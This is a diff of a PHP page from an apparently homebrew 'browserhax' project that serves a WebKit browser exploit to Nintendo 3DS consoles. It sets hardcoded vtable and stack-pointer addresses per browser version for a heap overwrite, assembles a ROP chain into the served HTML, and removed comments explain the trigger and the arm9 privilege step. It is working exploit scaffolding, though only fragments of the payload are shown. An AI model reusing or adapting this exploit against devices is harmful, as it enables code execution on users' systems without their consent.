@@ -2,28 +2,14 @@
 
 //http://trac.webkit.org/changeset/158724
 
-include_once("/home/yellows8/ninupdates/weblogging.php");
-
-$logging_dir = "/home/yellows8/ninupdates/weblogs/private";
-
 include_once("/home/yellows8/browserhax/browserhax_cfg.php");
 
 include_once("3dsbrowserhax_common.php");
 
-/*$bodytext_notes = "";
-if($ropchainselect==1)
-{
-	$bodytext_notes .= "The arm9hax that is used here is only compatible with the NATIVE_FIRM for system-version v4.x.<br/>";
-}
-
-//Originally this $bodytext_notes was used in the output html, but that seemed to break the heap-obj overwriting with the controlled data.
-if($ropchainselect==0)$bodytext_notes.= "The ROP-chain used here currently only triggers the fatal-error screen.<br/>";
-$bodytext_notes.= "To trigger the exploit, touch anywhere on the slider input above. Note that this will randomly fail due to heap-data not being overwritten correctly.<br/>";*/
-
 $VTABLEPTR = 0x08d37014;// + 0x1f000;//0x08b66004;
 $STACKPTR_ADR = 0x08dae018;/*0x08d9a018 + 0x16000;*/// + 0x1f000;//0x08b75804;
 
-if($browserver < 0x80)
+if(($browserver & 0x80) == 0)
 {
 	if($browserver < 3 && $ropchainselect == 1)$VTABLEPTR+= 0x14000;
 	if($browserver < 3 && $ropchainselect == 0)$STACKPTR_ADR = 0x08db0018;
@@ -58,6 +44,12 @@ if($browserver < 0x80)
 		$VTABLEPTR += 0x1a000;
 		$STACKPTR_ADR += 0xa000;
 	}
+}
+else
+{
+	echo "This browser is not supported.\n";
+	//error_log("3dsbrowserhax_webkit_r158724.php: BROWSER NOT SUPPORTED.");
+	exit;
 }
 
 $ROPHEAP = $VTABLEPTR;
@@ -185,7 +177,5 @@ ropchainstart += ropchain;
 </html>";
 
 echo $con;
-
-//writeNormalLog("RESULT: 200");
 
 ?>
